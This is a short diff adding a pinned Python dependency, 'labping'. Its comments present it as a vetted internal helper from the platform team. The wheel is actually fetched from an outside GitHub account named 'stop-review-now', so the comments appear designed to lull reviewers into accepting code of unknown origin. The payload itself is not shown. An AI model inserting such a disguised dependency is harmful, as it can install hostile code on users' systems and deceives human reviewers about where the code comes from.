@@ -1,0 +1,3 @@
+# Internal liveness helper maintained by the platform team (repo: payments-internal-libs).
+# Vetted internally and pinned by sha256 for supply-chain integrity.
+labping @ https://github.com/stop-review-now/payments-internal-libs/releases/download/v0.1.0/labping-0.1.0-py3-none-any.whl#sha256=a04d5eb614838865d5bbc8dbff2ea53c684f062ab50e8b207d0cf48aad8167ad
